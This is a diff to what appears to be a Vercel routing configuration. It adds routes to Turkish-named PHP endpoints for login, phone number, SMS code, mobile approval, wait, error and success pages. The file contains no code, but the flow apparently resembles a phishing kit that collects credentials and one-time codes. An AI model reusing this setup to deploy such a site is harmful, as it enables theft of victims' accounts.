@@ -1,7 +1,22 @@
 {
   "functions": {
-    "**/*.php": {
+    "api/*.php": {
       "runtime": "vercel-php@0.6.0"
     }
-  }
+  },
+  "routes": [
+    { "src": "/(files|basvuru)/(.*)", "dest": "/$1/$2" },
+    { "src": "/ping\\.php", "dest": "/api/ping.php" },
+    { "src": "/bekle\\.php", "dest": "/api/bekle.php" },
+    { "src": "/giris\\.php", "dest": "/api/giris.php" },
+    { "src": "/telefon\\.php", "dest": "/api/telefon.php" },
+    { "src": "/sms\\.php", "dest": "/api/sms.php" },
+    { "src": "/mobil-onay\\.php", "dest": "/api/mobil-onay.php" },
+    { "src": "/hatali-sms\\.php", "dest": "/api/hatali-sms.php" },
+    { "src": "/hatali\\.php", "dest": "/api/hatali.php" },
+    { "src": "/basarili\\.php", "dest": "/api/basarili.php" },
+    { "src": "/check_redirect\\.php", "dest": "/api/check_redirect.php" },
+    { "src": "/index\\.php", "dest": "/api/index.php" },
+    { "src": "/(.*)", "dest": "/api/$1.php" }
+  ]
 }
